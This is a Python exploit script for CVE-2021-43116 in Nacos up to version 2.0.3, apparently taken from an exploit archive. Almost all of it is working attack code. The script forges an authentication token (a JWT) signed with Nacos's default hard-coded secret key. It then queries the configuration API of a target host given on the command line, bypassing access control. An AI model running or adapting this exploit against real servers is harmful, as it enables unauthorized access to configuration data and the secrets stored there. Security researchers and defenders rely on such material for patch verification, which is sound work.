@@ -1,0 +1,120 @@
+id: 38438
+date: 04/03/2023
+title: Nacos 2.0.3 - Access Control vulnerability
+author: Jenson Zhao
+cves: CVE-2021-43116
+
+# Exploit Title: Nacos 2.0.3 - Access Control vulnerability
+# Date: 2023-01-17
+# Exploit Author: Jenson Zhao
+# Vendor Homepage: https://nacos.io/
+# Software Link: https://github.com/alibaba/nacos/releases/
+# Version: Up to (including)2.0.3
+# Tested on: Windows 10
+# CVE : CVE-2021-43116
+# Required before execution: pip install PyJWT,requests
+import argparse
+import base64
+import requests
+import time
+import json
+from jwt.algorithms import has_crypto, requires_cryptography
+from jwt.utils import base64url_encode, force_bytes
+from jwt import PyJWS
+
+class MyPyJWS(PyJWS):
+    def encode(self,
+               payload,  # type: Union[Dict, bytes]
+               key,  # type: str
+               algorithm='HS256',  # type: str
+               headers=None,  # type: Optional[Dict]
+               json_encoder=None  # type: Optional[Callable]
+               ):
+        segments = []
+
+        if algorithm is None:
+            algorithm = 'none'
+
+        if algorithm not in self._valid_algs:
+            pass
+
+        # Header
+        header = {'alg': algorithm}
+
+        if headers:
+            self._validate_headers(headers)
+            header.update(headers)
+
+        json_header = force_bytes(
+            json.dumps(
+                header,
+                separators=(',', ':'),
+                cls=json_encoder
+            )
+        )
+
+        segments.append(base64url_encode(json_header))
+        segments.append(base64url_encode(payload))
+
+        # Segments
+        signing_input = b'.'.join(segments)
+        try:
+            alg_obj = self._algorithms[algorithm]
+            key = alg_obj.prepare_key(key)
+            signature = alg_obj.sign(signing_input, key)
+
+        except KeyError:
+            if not has_crypto and algorithm in requires_cryptography:
+                raise NotImplementedError(
+                    "Algorithm '%s' could not be found. Do you have cryptography "
+                    "installed?" % algorithm
+                )
+            else:
+                raise NotImplementedError('Algorithm not supported')
+
+        segments.append(base64url_encode(signature))
+
+        return b'.'.join(segments)
+
+
+def JwtGenerate():
+    Secret = 'SecretKey01234567890123456789012345678901234567890123456789012345678'
+    payload = json.dumps(
+        {
+            "sub": "nacos",
+            "exp": int(time.time()) + 3600
+        },
+        separators=(',', ':')
+    ).encode('utf-8')
+    encoded_jwt = MyPyJWS().encode(payload, base64.urlsafe_b64decode(Secret), algorithm='HS256')
+    return encoded_jwt.decode()
+
+def check(url, https, token):
+    if https:
+        r = requests.get(
+            url='https://' + url + '/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&search=accurate&accessToken=' + token + '&username=',
+            verify=False)
+    else:
+        r = requests.get(
+            url='http://' + url + '/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=10&tenant=&search=accurate&accessToken=' + token + '&username=')
+    if r.status_code == 403:
+        print("There is no CVE-2021-43116 problem with the url!")
+    else:
+        print("There is CVE-2021-43116 problem with the url!")
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", help="URL of the target. example: 192.168.1.1:8848")
+    parser.add_argument("-s", "--https", help="Whether https is used. Default is false")
+    args = parser.parse_args()
+    url = args.target
+    https = False
+    if (args.https):
+        https = args.https
+    if url:
+        check(url, https, JwtGenerate())
+    else:
+        print('Please enter URL!')
+
+#  0day.today [2023-04-19]  #
